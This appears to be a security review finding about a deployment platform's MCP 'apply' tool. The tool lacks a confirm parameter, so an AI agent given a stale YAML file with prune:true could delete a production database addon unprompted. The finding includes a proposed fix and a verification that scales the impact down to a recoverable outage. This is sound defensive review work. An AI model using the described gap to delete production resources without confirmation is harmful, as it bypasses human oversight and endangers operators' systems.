failure_scenario: Agent is told 'sync this kuso.yml' and is handed (or generates) a file with prune: true that omits the production postgres addon — e.g. a stale repo checkout predating the addon. plan is optional and nothing forces it; apply runs, spec reconciler deletes the addon CR, helm tears down the StatefulSet and PVC, and the production database is gone with no confirmation prompt at any layer.
fix_sketch: Add confirm bool to applyArgs and refuse when the submitted YAML sets prune:true (or when the returned plan contains any *ToDelete entries) without confirm=true; alternatively run the dryRun plan first and refuse deletions unless confirm=true.
verify_reason: The gate-bypass mechanics are all real: applyArgs (mcp/internal/tools/apply.go:25-28) is only {project, yaml} with no confirm parameter, while every sibling mutating tool in projects.go requires confirm=true (bootstrap_project:158, update_project:225, add_service:313, manage_addon:377) and manage_addon delete additionally echoes the typed ?confirm=<addon-name> (projects.go:403-407). Server-side, spec/apply.go:138-141 calls r.Addons.Delete directly, bypassing the ?confirm=<addon> guard that lives only in the HTTP DELETE handler (handlers/addons.go:436-437), and the Apply HTTP handler (handlers/projects.go:532-589) adds no confirmation; the sole deletion gate is prune:true inside the same agent-supplied YAML (spec/apply.go:105-107). So an agent handed a stale kuso.yml with prune:true will delete a production addon with no confirmation at any layer. HOWEVER, the claimed impact is materially overstated: addon deletion does NOT destroy the PVC. addons.go:742-755 documents and logs that STS volumeClaimTemplates PVCs are RETAINED ("deliberate — an accidental delete shouldn't nuke a production DB") and re-adding the same addon name reuses the old data; the -conn Secret carries helm.sh/resource-policy:keep (v0.18.109) so the password survives too, and service-volume PVCs are likewise keep-annotated (kusoenvironment/templates/pvc.yaml:25). The only true data-drop path (dropInstanceAddonDB) is gated on the preview-pr label. Also, the CLI apply has no prune prompt either — prune:true-in-YAML is the deliberate terraform-style opt-in across the whole config-as-code surface, so this is a confirm-convention inconsistency on the MCP surface, not a missing server safeguard. Net effect of the failure scenario: an unconfirmed but recoverable production outage (StatefulSet torn down until re-apply), not data loss.
